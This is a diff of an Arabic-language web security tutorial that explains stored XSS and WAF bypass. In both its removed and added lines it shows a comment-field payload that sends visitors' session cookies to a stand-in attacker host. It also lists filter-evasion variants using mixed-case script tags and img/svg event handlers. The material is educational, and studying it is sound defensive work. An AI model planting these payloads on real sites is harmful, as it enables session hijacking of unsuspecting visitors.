@@ -320,7 +320,7 @@ Stored XSS بالتفصيل
 مثال عملي: لو فيه صفحة تعليقات في مدونة، وحطيت في خانة التعليق:
 
 html
-<script fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>
+ script fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>
 
 ولو الموقع خزّن التعليق ده وعرضه لكل الزوار من غير تنقية، كل زائر يفتح الصفحة كوكيز جلسته هتتبعت تلقائيًا للمهاجم.
 
@@ -743,7 +743,7 @@ WAF هي أنظمة تُستخدم لحماية تطبيقات الويب من �
 
 html
  ScRiPt>alert(1)</ScRiPt>
-<img src=x onerror=alert(1)>
-<svg onload=alert(1)>
+ img src=x onerror=alert(1)>
+ svg onload=alert(1)>
 
 كل شكل من دول بيحقق نفس الهدف بطريقة مختلفة، وده بيوضح ليه الاعتماد على فلتر بسيط بيبحث عن كلمة واحدة بالظبط مش كافي أبدًا كحماية حقيقية.
